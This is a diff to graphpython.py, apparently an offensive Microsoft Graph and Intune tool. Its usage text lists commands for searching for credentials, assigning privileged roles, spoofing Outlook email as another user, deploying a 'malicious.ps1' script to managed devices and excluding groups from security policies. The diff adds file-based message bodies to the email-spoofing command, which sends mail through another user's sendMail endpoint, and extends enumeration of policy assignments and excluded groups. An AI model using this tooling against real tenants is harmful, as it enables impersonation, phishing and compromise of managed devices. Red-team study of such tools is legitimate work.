@@ -578,7 +578,7 @@ def main():
           graphpython.py --command invoke-search --search "credentials" --entity driveItem --token token
           graphpython.py --command invoke-customquery --query https://graph.microsoft.com/v1.0/sites/{siteId}/drives --token token
           graphpython.py --command assign-privilegedrole --token token
-          graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token
+          graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token --email email-body.txt
           graphpython.py --command get-manageddevices --token intune-token
           graphpython.py --command deploy-maliciousscript --script malicious.ps1 --token token
           graphpython.py --command add-exclusiongrouptopolicy --id <policyid> --token token
@@ -606,6 +606,7 @@ def main():
     parser.add_argument("--mail-folder", choices=['allitems', 'inbox', 'archive', 'drafts', 'sentitems', 'deleteditems', 'recoverableitemsdeletions'], help="Mail folder to dump (dump-owamailbox)")
     parser.add_argument("--top", type=int, help="Number (int) of messages to retrieve (dump-owamailbox)")
     parser.add_argument("--script", help="File containing the script content (deploy-maliciousscript)")
+    parser.add_argument("--email", help="File containing OWA email message body content (spoof-owaemailmessage)")
     args = parser.parse_args()
 
     if len(sys.argv) == 1:
@@ -3975,9 +3976,14 @@ def main():
 
     # spoof-owaemailmessage
     elif args.command and args.command.lower() == "spoof-owaemailmessage":
+        if not args.email:
+            print_red("[-] Error: --email argument is required for Spoof-OWAEmailMessage command")
+            return
+
         print_yellow("\n[*] Spoof-OWAEmailMessage")
         print("=" * 80)
         api_url = "https://graph.microsoft.com/v1.0/me/sendMail"
+        
         if args.id:
             api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/sendMail"
         user_agent = get_user_agent(args)
@@ -3986,9 +3992,9 @@ def main():
             'Content-Type': 'application/json',
             'User-Agent': user_agent
         }
+
         try:
             subject = input("\nEnter Subject: ").strip()
-            content = input("Enter Body Content: ").strip()
             torecipients = input("Enter toRecipients (comma-separated): ").strip()
             ccrecipients = input("Enter ccRecipients (comma-separated): ").strip()
             savetf = input("Save To Sent Items (true/false): ").strip().lower() == 'false' # default
@@ -3998,12 +4004,14 @@ def main():
         to_recipients = [{"emailAddress": {"address": email.strip()}} for email in torecipients.split(',') if email.strip()]
         cc_recipients = [{"emailAddress": {"address": email.strip()}} for email in ccrecipients.split(',') if email.strip()]
 
+        content = read_file_content(args.email)
+
         json_body = {
             "message": {
                 "subject": subject,
                 "body": {
                     "contentType": "Text",
-                    "content": content
+                    "content": content 
                 },
                 "toRecipients": to_recipients,
                 "ccRecipients": cc_recipients
@@ -4131,7 +4139,6 @@ def main():
         print_yellow("\n[*] Get-DeviceConfigurationPolicies")
         print("=" * 80)
         api_url = "https://graph.microsoft.com/beta/deviceManagement/configurationPolicies"
-
         if args.select:
             api_url += "?$select=" + args.select
         
@@ -4156,6 +4163,10 @@ def main():
                 for key, value in policy.items():
                     print(f"{key} : {value}")
                 
+                # Print template information
+                if 'templateReference' in policy and 'templateDisplayName' in policy['templateReference']:
+                    print(f"template: {policy['templateReference']['templateDisplayName']}")
+                
                 # display assignments for each policy
                 policy_id = policy.get('id')
                 if policy_id:
@@ -4165,19 +4176,29 @@ def main():
                     if assignments_response.status_code == 200:
                         assignments = assignments_response.json()
                         if not assignments.get('value'):
-                            print_red("assignmentTarget: No assignments")
+                            print_red("assignments: None")
                         else:
+                            print_green("assignments:")
                             for assignment in assignments.get('value', []):
-                                # Print assignmentTarget if 'target' exists in the assignment
                                 if 'target' in assignment:
-                                    print_green(f"assignmentTarget : {assignment['target']}")
-                                else:
-                                    print_red("assignmentTarget: No assignments")
+                                    target = assignment['target']
+                                    odata_type = target.get('@odata.type', '').split('.')[-1]
+                                    if odata_type == 'exclusionGroupAssignmentTarget':
+                                        group_id = target.get('groupId', 'N/A')
+                                        print(f"- Excluded Group ID: {group_id}")
+                                    elif odata_type == 'allLicensedUsersAssignmentTarget':
+                                        print("- Assigned to all users")
+                                    elif odata_type == 'allDevicesAssignmentTarget':
+                                        print("- Assigned to all devices")
+                                    elif odata_type == 'groupAssignmentTarget':
+                                        group_id = target.get('groupId', 'N/A')
+                                        print(f"- Assigned to Group ID: {group_id}")
+                                    else:
+                                        print(f"- {odata_type}: {target}")
                     else:
                         print_red(f"[-] Error: API request for assignments failed with status code {assignments_response.status_code}")
                 print("\n")
             print("=" * 80)
-
 
     # get-deviceconfigurationpolicysettings
     elif args.command and args.command.lower() == "get-deviceconfigurationpolicysettings":
@@ -5195,6 +5216,7 @@ def main():
         else:
             print_red(f"[-] Failed to retrieve current assignments: {response.status_code}")
             print_red(response.text)
+            print("=" * 80)
             return
         
         try:
@@ -5286,7 +5308,7 @@ def main():
         if response.status_code == 201:
             print_green("\n[+] Script created successfully")
             script_id = response.json().get('id')
-            print(f"Script ID: {script_id}")
+            print_green(f"[+] Script ID: {script_id}")
 
             url_assign = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{script_id}/assign"
             
